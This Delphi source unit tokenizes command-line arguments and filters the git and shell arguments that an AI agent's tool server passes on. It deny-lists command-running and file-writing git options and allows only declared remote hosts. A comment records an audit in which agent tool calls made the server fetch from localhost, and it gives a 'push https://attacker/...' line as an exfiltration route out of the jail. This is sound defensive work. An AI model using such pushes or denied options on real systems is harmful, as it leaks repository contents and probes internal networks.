unit Lsp.Args;

{ LOS ARGUMENTOS DE UNA ORDEN: el troceador de una linea de argumentos
  (TrocearArgs) y su compositor (EnComillas), las puertas de lo que llega a
  la linea de git y de los lanzadores (GitArgDenied, GitRemoteDenied con su
  lector de host GitUrlHost, ShellArgDenied), la clasificacion de una orden
  de git en consulta o escritura (GitCommandIsQuery) y el nombre del fichero
  del mensaje de un commit (NombreDeMensajeGit).

  Salen de Lsp.Guard el 8-oct-2026 (la 1.18.0, la version de la limpieza),
  movidos sin cambiar una linea, con PrimerTrozo, el unico trozo de la jaula
  que usaban. Van DEBAJO de la jaula: la puerta de entrada (ToolCallDenied)
  y la credencial de solo lectura preguntan aqui, y aqui solo se pregunta a
  Lsp.Settings (los remotos declarados) y a Lsp.Casa (la temporal del
  servidor). }

interface

{ El primer trozo de S partido por ASeps; '' si S es ''. S.Split(...)[0] a
  secas lee fuera del array cuando S es '' (Delphi devuelve un array
  VACIO): un Access violation medido el 25-ago en delphi_edit y parcheado
  en ESE sitio, y otra vez el 26-sep en delphi_textedit (una tanda con un
  ancla vacia y "occurrence"), con otros cinco Split()[0] sueltos. }
function PrimerTrozo(const S: string; const ASeps: array of Char): string;

{ Trocea una linea de argumentos con las reglas del runtime de C de Windows
  (CommandLineToArgvW), las mismas que aplica git.exe: las comillas dobles
  agrupan y desaparecen ("mis notas.txt" es UNO), "" dentro de comillas es una
  comilla literal, y una barra invertida solo es especial ante una comilla. Es
  el UNICO troceador: el argv que remote-run da al programa, las rutas de stash
  push de delphi_git y el filtro de opciones de git (GitArgDenied/
  GitRemoteDenied), que asi juzga cada argumento TAL COMO lo recibira git. Su
  inversa, aqui al lado, es el compositor EnComillas. Vivia en
  Lsp.RemoteRun y la 1.5.1 le escribio un gemelo en Lsp.Guard (PartirArgs)
  sin verlo: ahora es uno, donde lo alcanzan los dos. }
function TrocearArgs(const AArgs: string): TArray<string>;

{ La INVERSA de TrocearArgs: compone UN argumento para una linea de comando que
  el CRT de Windows (git.exe, spawn directo sin shell) vuelve a trocear EXACTO
  en este argumento. Dobla las barras invertidas que preceden a una comilla -
  incluida la de cierre - y escapa cada comilla con \". Un solo nombrador: quien
  COMPONE una linea de git la usa; quien la LEE, TrocearArgs. Vivia en
  Mcp.Tools.Workspace y volvio a Lsp.Guard, con su inversa, el 26-sep-2026. }
function EnComillas(const AValor: string): string;
function NombreDeMensajeGit: string;

{ La mitad de CONSULTA de delphi_git: lo que una credencial de solo lectura
  y un proyecto de REFERENCIA (ReadOnlyRoots) pueden ejecutar. UNA lista:
  la consulta ToolCallDenied y la consulta la propia tool. }
function GitCommandIsQuery(const ACmd, AArgs, AMessage: string): Boolean;

{ '' when AText carries none of the shell metacharacters that would break a
  command line ( ; | & ` $ < > and newlines ), otherwise a refusal. For tool
  arguments that end up on a paclient/msbuild command line. }
function ShellArgDenied(const AText: string): string;

{ Whether a git argument names a remote the operator has NOT allowed.

  Measured 2026-08-25 by an auditor working only through MCP: `delphi_git
  command=fetch args="http://127.0.0.1:3131/mcp"` made the SERVER open a
  connection to that address, and `push https://attacker/... HEAD:main` would
  have walked the jail's contents out of the building. The agent's universe is
  supposed to end at the jail; an arbitrary outbound URL turns the server into
  a proxy into its own network (localhost, internal services, metadata
  endpoints) and into an exfiltration channel.

  Toda direccion de red pasa por GitRemotes= del workspace activo, una
  lista de hosts que declara el operador. Vacia (el valor por defecto),
  niega tanto las direcciones de la llamada como las de un remoto del repo.
  Solo el operador decide los hosts con los que esta maquina puede hablar. }
function GitRemoteDenied(const AText: string; AScpCorto: Boolean = False): string;

{ El host de una direccion de RED de git; '' si no lo es (un nombre, una
  rama, una carpeta). El lector de GitRemoteDenied, en la interface desde la
  1.7.7: la tool de git pregunta con el si el remoto de una llamada es de red
  o es una carpeta, que pasa por la jaula. UN lector de "esto es una
  direccion de red". }
function GitUrlHost(const AToken: string; AScpCorto: Boolean = False): string;

{ La puerta de los argumentos libres de git (que niega y por que, en su nota
  de la implementacion): la pregunta la puerta de entrada de Lsp.Guard
  (ReglasDeLaLlamadaDenegadas). }
function GitArgDenied(const AArgs, ACmd: string): string;

implementation

uses
  System.SysUtils,
  System.StrUtils,
  System.IOUtils,
  System.RegularExpressions,
  Lsp.Texts,
  Lsp.Settings,         // GitRemoteHosts: los remotos que declara el workspace
  Lsp.Casa;             // ServerTempDir: el mensaje de un commit, en la casa

{ Trocea una linea de comando con las reglas del runtime de C de Windows
  (CommandLineToArgvW), las mismas que aplica git.exe (spawn directo, sin
  shell): las comillas dobles agrupan y desaparecen, "" dentro de comillas es
  una comilla literal, y una barra invertida SOLO es especial ante una comilla
  (2n barras = n y la comilla delimita; 2n+1 = n y comilla literal). Es el
  UNICO troceador, y su inversa es EnComillas (aqui al lado): la puerta valida
  el argv que este devuelve y el ejecutor
  recompone la linea desde el MISMO argv, asi que nadie lee la cadena de dos
  formas distintas (medido 26-sep-2026: --o"utput"= colaba una opcion prohibida
  ante un troceo que solo miraba espacios). }
function TrocearArgs(const AArgs: string): TArray<string>;
var
  I, N, Barras, K: Integer;
  Actual: string;
  Dentro, Hay: Boolean;
begin
  Result := nil;
  Actual := '';
  Dentro := False; // dentro de comillas dobles
  Hay := False;    // hay un argumento en curso (aunque sea "", que es uno vacio)
  I := 1;
  N := Length(AArgs);
  while I <= N do
  begin
    if AArgs[I] = '\' then
    begin
      // Una barra invertida SOLO es especial ante una comilla. Cuenta la racha.
      Barras := 0;
      while (I <= N) and (AArgs[I] = '\') do
      begin
        Inc(Barras);
        Inc(I);
      end;
      if (I <= N) and (AArgs[I] = '"') then
      begin
        // 2n barras + comilla = n barras y la comilla delimita; 2n+1 barras =
        // n barras y una comilla LITERAL (no delimita).
        for K := 1 to Barras div 2 do
          Actual := Actual + '\';
        Hay := True;
        if Odd(Barras) then
        begin
          Actual := Actual + '"';
          Inc(I); // la comilla se consume como literal
        end;
        // Barras par: la comilla queda para la vuelta siguiente (delimita).
      end
      else
      begin
        for K := 1 to Barras do
          Actual := Actual + '\'; // no preceden a comilla: literales
        Hay := True; // hubo contenido: un arg de SOLO barras no se pierde
      end
    end
    else if AArgs[I] = '"' then
    begin
      if Dentro and (I < N) and (AArgs[I + 1] = '"') then
      begin
        Actual := Actual + '"'; // "" dentro de comillas = una comilla literal
        Hay := True;
        Inc(I, 2);
      end
      else
      begin
        Dentro := not Dentro; // abre o cierra: agrupa, no es un caracter
        Hay := True;
        Inc(I);
      end;
    end
    else if CharInSet(AArgs[I], [' ', #9, #13, #10]) and not Dentro then
    begin
      if Hay then
        Result := Result + [Actual];
      Actual := '';
      Hay := False;
      Inc(I);
    end
    else
    begin
      Actual := Actual + AArgs[I];
      Hay := True;
      Inc(I);
    end;
  end;
  if Hay then
    Result := Result + [Actual];
end;

function EnComillas(const AValor: string): string;
var
  I, N, Barras, K: Integer;
begin
  // La inversa de TrocearArgs (arriba): deja un token que el runtime de C de
  // Windows (git.exe, spawn directo sin shell) vuelve a trocear EXACTAMENTE en
  // este argumento. Dobla las barras invertidas que preceden a una comilla -
  // incluida la de cierre - y escapa cada comilla con \".
  if (AValor <> '') and (AValor.IndexOfAny([' ', #9, #13, #10, '"']) < 0) then
    Exit(AValor); // sin blancos ni comillas: no necesita comillas
  Result := '"';
  I := 1;
  N := Length(AValor);
  while I <= N do
  begin
    Barras := 0;
    while (I <= N) and (AValor[I] = '\') do
    begin
      Inc(Barras);
      Inc(I);
    end;
    if I > N then
    begin
      for K := 1 to Barras * 2 do
        Result := Result + '\'; // barras finales: dobladas ante la comilla de cierre
    end
    else if AValor[I] = '"' then
    begin
      for K := 1 to Barras * 2 + 1 do
        Result := Result + '\';
      Result := Result + '"';
      Inc(I);
    end
    else
    begin
      for K := 1 to Barras do
        Result := Result + '\';
      Result := Result + AValor[I];
      Inc(I);
    end;
  end;
  Result := Result + '"';
end;

{ UN nombrador del fichero -F de git, junto a su filtro de argumentos. }
function NombreDeMensajeGit: string;
begin
  Result := TPath.Combine(ServerTempDir('git'),
    'msg-' + TGUID.NewGuid.ToString + '.txt');
end;

{ Las opciones que traen ficheros o configuracion ajena al filtro. Git admite
  prefijos largos y grupos cortos (-aF, -qF, -nc): se juzgan las dos formas. }
function OpcionDeFicheroGit(const ATok: string): Boolean;
var
  Opcion: string;
  P, I: Integer;
begin
  Result := False;
  if ATok.StartsWith('--') then
  begin
    Opcion := LowerCase(ATok);
    P := Pos('=', Opcion);
    if P > 0 then
      Opcion := Copy(Opcion, 1, P - 1);
    if Length(Opcion) > 2 then
      Result := '--file'.StartsWith(Opcion) or
        '--pathspec-from-file'.StartsWith(Opcion) or
        '--config'.StartsWith(Opcion);
  end
  else if ATok.StartsWith('-') then
  begin
    // -S<texto> y -G<texto> (el pickaxe de git log/diff, SOLO LECTURA): el
    // resto del token es el VALOR de busqueda, no un grupo de opciones cortas.
    // No se analiza: un valor con 'F'/'O'/'c' no es -F/-O/-c (medido 2026-10-06:
    // `git log -SOpen` caia por la 'O' del valor). El valor no abre nada -no es
    // ruta, ni fichero, ni comando- y los metacaracteres de shell ya los corta
    // TrocearArgs. -S y -G siempre llevan valor; no se agrupan con otras.
    if (Length(ATok) > 2) and CharInSet(ATok[2], ['S', 'G']) then
      Exit(False);
    // Mayusculas: -f no es -F, y -o no es -O.
    Result := (Pos('F', ATok) > 0) or (Pos('O', ATok) > 0);
    if Result then
      Exit;
    Opcion := LowerCase(ATok);
    for I := 2 to Length(Opcion) do
    begin
      if Opcion[I] = 'c' then
        Exit(True);
      // Opciones sin valor de clone; -b/-u/-o/-j consumen lo que sigue.
      // No tratar la c de -bfeaturec como otra opcion del grupo.
      if not CharInSet(Opcion[I], ['n', 'v', 'q', 'l', 's']) then
        Break;
    end;
  end;
end;

{ Filtro de opciones peligrosas de git en la UNICA puerta: git tiene opciones
  que escriben ficheros, leen rutas FUERA del repo o ejecutan un programa - una
  fuga de la jaula usable hasta por un cliente de solo lectura (medido: `diff
  --output=<ruta abs>` escribio un fichero en cualquier sitio del disco, y
  --o"utput"= se colaba cuando la puerta troceaba solo por espacios mientras el
  CRT de git quitaba las comillas y la ejecutaba). Trocea con TrocearArgs - el
  mismo lector cuya inversa usa el ejecutor para componer la linea -, asi que
  cada token se juzga TAL COMO lo recibira git. Lo pregunta la puerta, para que
  valga en AMBOS niveles de acceso (el -C <repo> no frena un --output absoluto).
  '' = limpio. }
{ LISTA NEGRA: argumentos libres de git, con opciones peligrosas conocidas.
  La config y los remotos tienen sus puertas cerradas independientes. }
function GitArgDenied(const AArgs, ACmd: string): string;
var
  Tok, T: string;
begin
  Result := '';
  for Tok in TrocearArgs(AArgs) do
  begin
    T := Tok.ToLower;
    if MatchText(ACmd, ['commit', 'tag']) then
    begin
      // Git admite abreviaciones largas y grupos cortos: --gpg, -aS, -fs.
      // Una opcion que consume texto corta el grupo; la S de -mMENSAJE no firma.
      var Opcion := PrimerTrozo(T, ['=']);
      // Firma REAL (gpg): se niega. --signoff / -s / --sign en commit solo
      // ponen "Signed-off-by" y NO firman -> se admiten; en tag, --sign SI es
      // -s (gpg), por eso su prefijo se niega solo ahi.
      var Firma := (Length(Opcion) >= 3) and
        ('--gpg-sign'.StartsWith(Opcion) or
         ((ACmd = 'tag') and '--sign'.StartsWith(Opcion)) or
         ((ACmd = 'tag') and '--local-user'.StartsWith(Opcion)));
      if Tok.StartsWith('-') and not Tok.StartsWith('--') then
        for var I := 2 to Length(Tok) do
        begin
          if (Tok[I] = 'S') or ((ACmd = 'tag') and CharInSet(Tok[I], ['s', 'u'])) then
          begin
            Firma := True;
            Break;
          end;
          if not CharInSet(Tok[I], ['a', 'f', 'v', 'q', 'e', 'i', 'o', 'd', 'l']) then
            Break;
        end;
      if Firma then
        Exit(MsgFmt(SR_GIT_OPTION_FMT, [Tok]));
    end;
    if OpcionDeFicheroGit(Tok) or
       T.StartsWith('--output') or          // writes a file (diff/show)
       T.StartsWith('--no-index') or        // reads arbitrary paths, any dir
       T.StartsWith('--upload-pack') or T.StartsWith('--receive-pack') or
       T.StartsWith('--exec') or            // runs a remote/local command
       T.StartsWith('--ext-diff') or T.StartsWith('--textconv') or // ext program
       // Configuracion: tambien prefijos y grupos, en OpcionDeFicheroGit.
       T.StartsWith('--separate-git-dir') or T.StartsWith('--template') or // write/read outside the dest
       T.StartsWith('--git-dir') or T.StartsWith('--work-tree') or // redirect where git operates -> jail escape
       (T = '-o') or T.StartsWith('-o=') or T.StartsWith('-o/') or T.StartsWith('-o\') then
      Exit(MsgFmt(SR_GIT_OPTION_FMT, [Tok]));
  end;
end;

{ Host of a git URL, '' when the token is not a URL at all. Understands the
  two shapes git takes: scheme://[user@]host[:port]/... and the scp-like
  [user@]host:path. }
function GitUrlHost(const AToken: string; AScpCorto: Boolean): string;
var
  T: string;
  P: Integer;
begin
  Result := '';
  T := AToken.Trim.Trim(['"', '''']);
  P := Pos('://', T);
  if P > 0 then
    T := Copy(T, P + 3, MaxInt)
  else if (Pos('@', T) > 0) and (Pos(':', T) > Pos('@', T)) then
    T := Copy(T, Pos('@', T) + 1, MaxInt)
  else if AScpCorto and
          TRegEx.IsMatch(T, '^[A-Za-z0-9][A-Za-z0-9.-]+:[^:\\]') then
    { scp corto host:ruta: el host se recorta en el ':' del bucle de abajo;
      dos letras o mas antes del ':' -> no es una unidad (C:\ o C:/) }
  else
    Exit; // not a URL: a branch, a path, an option
  P := Pos('@', T);
  if P > 0 then
    T := Copy(T, P + 1, MaxInt);
  // [::1]:3131 - the host is what the brackets hold, not the bracket
  if T.StartsWith('[') then
  begin
    P := Pos(']', T);
    if P > 1 then
      Exit(Copy(T, 2, P - 2).Trim.ToLower);
    Exit('[' + T); // malformed: keep it unrecognisable so it cannot match
  end;
  for P := 1 to Length(T) do
    if CharInSet(T[P], ['/', ':', '\']) then
    begin
      T := Copy(T, 1, P - 1);
      Break;
    end;
  Result := T.Trim.ToLower;
end;

function GitRemoteDenied(const AText: string; AScpCorto: Boolean): string;
var
  Tok, Host, Allowed: string;
  Ok: Boolean;
begin
  Result := '';
  for Tok in TrocearArgs(AText) do
  begin
    Host := GitUrlHost(Tok, AScpCorto);
    if Host = '' then
      Continue;
    Allowed := GitRemoteHosts;
    if Allowed = '' then
      Exit(MsgFmt(SR_GIT_REMOTE_OFF_FMT, [Host]));
    Ok := False;
    for var H in Allowed.Split([',', ';'], TStringSplitOptions.ExcludeEmpty) do
      if SameText(H.Trim, Host) then
      begin
        Ok := True;
        Break;
      end;
    if not Ok then
      Exit(MsgFmt(SR_GIT_REMOTE_HOST_FMT, [Host, Allowed]));
  end;
end;

{ LISTA NEGRA: metacaracteres de shell conocidos; no sustituye las listas
  blancas de ordenes, identificadores o plataformas de cada herramienta. }
function ShellArgDenied(const AText: string): string;
const
  Bad: array [0 .. 8] of string = (';', '|', '&', '`', '$', '<', '>', #13, #10);
var
  B: string;
begin
  Result := '';
  for B in Bad do
    if AText.Contains(B) then
      Exit(MsgFmt(SR_SHELL_META_FMT, [B]));
end;

function GitCommandIsQuery(const ACmd, AArgs, AMessage: string): Boolean;
begin
  Result := MatchText(Trim(ACmd), ['status', 'diff', 'log', 'show', 'ls-remote']) or
    (MatchText(Trim(ACmd), ['branch', 'tag']) and (Trim(AArgs) = '') and (Trim(AMessage) = '')) or
    // worktree list solo ENSENA las copias de trabajo (1.4.0)
    (SameText(Trim(ACmd), 'worktree') and SameText(Trim(AArgs), 'list')) or
    // ...y stash list, lo aparcado: pasaba por escritura, con el cerrojo
    // de los escritores y parando los motores del repo (1.7.7)
    (SameText(Trim(ACmd), 'stash') and SameText(Trim(AArgs), 'list'));
end;

function PrimerTrozo(const S: string; const ASeps: array of Char): string;
var
  Partes: TArray<string>;
begin
  Partes := S.Split(ASeps);
  if Length(Partes) = 0 then
    Result := ''
  else
    Result := Partes[0];
end;

end.